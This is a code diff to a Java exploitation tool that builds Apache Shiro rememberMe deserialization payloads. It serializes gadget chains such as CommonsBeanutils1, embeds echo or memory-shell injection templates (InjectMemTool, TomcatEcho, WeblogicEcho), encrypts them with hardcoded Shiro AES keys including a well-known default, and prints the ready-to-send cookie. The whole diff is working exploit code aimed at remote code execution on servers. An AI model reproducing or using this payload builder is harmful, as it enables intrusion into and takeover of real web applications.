@@ -4,6 +4,9 @@ import com.mchange.v2.ser.SerializableUtils;
 import javassist.ClassPool;
 import javassist.CtClass;
 import org.apache.commons.lang.StringUtils;
+import org.apache.shiro.crypto.AesCipherService;
+import org.apache.shiro.crypto.CipherService;
+import org.apache.shiro.util.ByteSource;
 import vulgui.deser.echo.EchoPayload;
 import vulgui.deser.payloads.CommonsCollections2;
 import vulgui.deser.payloads.ObjectPayload;
@@ -38,27 +41,6 @@ public class Shiro implements FramePayload {
         return null;
     }
 
-    public String sendpayload(byte[] serpayload, String key) throws Exception {
-        /**
-         * @description: shiro反序列化payload最后阶段进行序列化
-         * @param: * @param: chainObject构造链对象
-         * @param: key shiro密钥
-         * @return: java.lang.String
-         * @author sunnylast0
-         * @date: 2020/9/11 19:59
-         */
-        // SerializableUtils.deserializeFromByteArray(serpayload);
-//        byte[] serpayload = Files.readAllBytes(Paths.get("src/ysoserial/cb1.ser"));
-//        try (FileOutputStream fos = new FileOutputStream("src/ysoserial/cb1.ser")) {
-//            fos.write(serpayload);
-//            //fos.close(); There is no more need for this line since you had created the instance of "fos" inside the try. And this will automatically close the OutputStream
-//        }
-
-        byte[] encryptpayload = AesUtil.encrypt(serpayload, key);
-        // System.out.println("rememberMe=" + DatatypeConverter.printBase64Binary(encryptpayload));
-        return "rememberMe=" + DatatypeConverter.printBase64Binary(encryptpayload);
-    }
-
     @Override
     public String sendpayload(Object chainObject, String key) throws Exception {
         /**
@@ -69,35 +51,37 @@ public class Shiro implements FramePayload {
          * @author sunnylast0
          * @date: 2020/9/11 19:59
          */
-        byte[] serpayload = SerializableUtils.toByteArray(chainObject);
-        // SerializableUtils.deserializeFromByteArray(serpayload);
-//        byte[] serpayload = Files.readAllBytes(Paths.get("src/ysoserial/cb1.ser"));
-//        try (FileOutputStream fos = new FileOutputStream("src/ysoserial/cb1.ser")) {
-//            fos.write(serpayload);
-//            //fos.close(); There is no more need for this line since you had created the instance of "fos" inside the try. And this will automatically close the OutputStream
-//        }
 
-        byte[] encryptpayload = AesUtil.encrypt(serpayload, key);
-        // System.out.println("rememberMe=" + DatatypeConverter.printBase64Binary(encryptpayload));
+        byte[] serpayload = SerializableUtils.toByteArray(chainObject);
+
+        byte[] bkey = DatatypeConverter.parseBase64Binary(key);
+
+        byte[] encryptpayload = null;
+
+        if (DserUtil.aesCipherType == 1) {
+            CipherService cipherService = new AesCipherService();
+            ByteSource byteSource = cipherService.encrypt(serpayload, bkey);
+            encryptpayload = byteSource.getBytes();
+        } else {
+            encryptpayload = AesUtil.encrypt(serpayload, bkey);
+        }
+
         return "rememberMe=" + DatatypeConverter.printBase64Binary(encryptpayload);
     }
 
 
     public static void main(String[] args) throws Exception {
-        Class<? extends ObjectPayload> gadgetClazz = ObjectPayload.Utils.getPayloadClass("CommonsCollections8");
+        Class<? extends ObjectPayload> gadgetClazz = ObjectPayload.Utils.getPayloadClass("CommonsBeanutils1");
         ObjectPayload<?> gadgetpayload = gadgetClazz.newInstance();
 
-        List<String> echoList = Arrays.asList("TomcatEcho", "TomcatEcho1", "TomcatEcho2", "SpringEcho", "SpringEcho1", "TestClassLoad", "NoEcho", "JbossEcho", "WeblogicEcho");
-        List<String> pluginList = Arrays.asList("InjectMemTool", "InjectMomBehinder", "InjectClassLoader");
+        List<String> echoList = Arrays.asList("TomcatEcho", "InjectMemTool", "SpringEcho", "NoEcho", "JbossEcho", "WeblogicEcho", "TomcatHeaderEcho");
 
-        String option = "WeblogicEcho";
+        String option = "InjectMemTool";
 
         Object template = null;
         Object chainObject = null;
         if (echoList.contains(option)) {
             template = Gadgets.createTemplatesImpl(option);
-        } else if (pluginList.contains(option)) {
-            template = Gadgetsplugin.createTemplatesImpl(option);
         } else {
             template = GadgetsK.createTemplatesTomcatEcho();
         }
@@ -105,8 +89,7 @@ public class Shiro implements FramePayload {
         Shiro shiro = new Shiro();
         if (template != null && !option.equals("KeyEcho") && !option.equals("WeblogicEcho")) {
             chainObject = gadgetpayload.getObject(template);
-
-            final String sendpayload = shiro.sendpayload(chainObject, "kPH+bIxk5D2deZiIxcaaaA==");
+            final String sendpayload = shiro.sendpayload(chainObject, "6ZmI6I2j3Y+R1aSn5BOlAA==");
             System.out.println(sendpayload);
         } else {
             // jsf viewstate deser
